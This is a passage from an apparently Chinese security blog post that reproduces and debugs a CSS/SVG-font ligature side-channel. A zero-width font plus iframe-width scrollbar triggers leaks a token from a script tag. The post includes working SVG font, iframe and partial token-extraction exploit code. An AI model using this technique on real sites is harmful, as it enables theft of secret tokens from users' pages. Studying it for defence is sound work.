<span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'g'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'h'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'i'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'j'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'k'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'l'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'m'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'n'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'o'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'p'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'q'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'r'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'s'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'t'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'u'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'v'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'w'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'x'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'y'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'z'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'{'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'|'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'}'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'~'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'"7'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'10000'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>也就是说这里构造了一个除了<code>"7</code>连字有一定宽度之外，其他字符都是0宽度。</p><p>第二个页面就是 font.html ，内容比较简单，构造一个适当宽度的 iframe 将 test.html 引入即可。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/test.html"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:500px"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>至于 width 为 500 px，是<code>script</code>标签内内容长度，这个需要宽度也比较关键，因为 svg 中连字的构建也不是特比好构建，也就是如果无法构建好连字，也就无法弄出滚动条，也就无处触发我们构造的请求了。所以 iframe 的宽度并不是越宽越好… svg horiz-adv-x 的参数也不是越大就能触发…</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120012326.png" alt=""></p><p>如果按照原作者设置的 iframe width 为 40px，svg 连字 horiz-adv-x 参数为 1000 的话，就会出现如上情况。如果各位小伙伴去自己尝试一下就会发现，有一个很明显的 lightblue 颜色的瞬间，也就是 script 标签的颜色，个人认为因为浏览器渲染的顺序问题，先把在这个场景中长度为 463px 的 script 标签首先因为<code>display:table</code>的原因，在网络请求字体之前首先被渲染了，所以会看到一条 lightblue 颜色带一闪而过，导致撑破了 iframe 设置的长度，也就产生了滚动条，随即触发了我们构造的请求，随后字体才会被浏览器进行渲染，然后将我们构造的其他字体设为 0 宽度。</p><p>而且还有一些问题就是缓存的问题，效果如下：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120013522.png" alt=""></p><p>这也是原作者在原文提到的先发送一个请求让 chrome 缓存好字体的原因，但是这个方法及其不稳定…用原作者的代码直接跑跑的结果也是五花八门，每次跑都不一样。</p><p>然后比较稳定的办法是，预测 script 标签内的长度，比如这里的 463px ，我们设置一个比它大的值，这样一开始的渲染就不会影响到我们的结果了，对应的连字 horiz-adv-x 我们也将其扩大到 500000 ，这样就能保证每次都可以以正确的结果造成宽度溢出然后触发我们的请求了。</p><p>But，这个办法需要知道大概 script 标签内大概的宽度，万一不知道呢？</p><p>我们可以参考 ROIS 的做法，使用 iframe 的 onload 事件，当 iframe 加载完成之后再将 iframe 宽度缩小，这样就能稳定触发了。也就是说 font.html 中 iframe 我们可以这么写：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/test.html"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:10000px"</span>  <span class="hljs-attr">onload</span>=<span class="hljs-string">"event.target.style.width='100px'"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>一开始设置一个特别大的宽度，保证不会因为渲染顺序的原因触发我们构造的请求，待到 iframe 内字体加载完毕，再将其宽度缩小，触发我们构造的请求。</p><p>以下是原作者使用二分加快爆破、提前缓存避免缓存问题构造的 index.html 代码：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">utf-8</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">cookie.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">    (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-string">'0123456789abcdef'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// W poniższym elemencie będziemy wypisywać przeczytany token.</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">const</span> outputElement = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// W tej zmiennej przechowamy token, który udało się już</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// wydobyć</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// W tej zmiennej przechowamy prefix do tworzenia ligatur</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> prefix = <span class="hljs-string">'"'</span>;</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Wysokopoziomowo: po prostu wyciągamy kolejny znak tokena</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// dopóki nie wyciągnęliśmy wszystkich znaków :) </span></span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">while</span> (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) {</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> nextTokenChar = <span class="hljs-keyword">await</span> getNextTokenCharacter();</span></span><br><span class="line">            extractedToken += nextTokenChar;</span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Znak, który wyciągnęliśmy musi być też dodany do przedrostka</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// dla następnych ligatur.</span></span></span><br><span class="line">            prefix += nextTokenChar;</span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Wypiszmy w HTML-u jaki token jak na razie wyciągnęliśmy.</span></span></span><br><span class="line">            outputElement.textContent = extractedToken;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Jak dotarliśmy tutaj, to znaczy, że mamy cały token!</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span 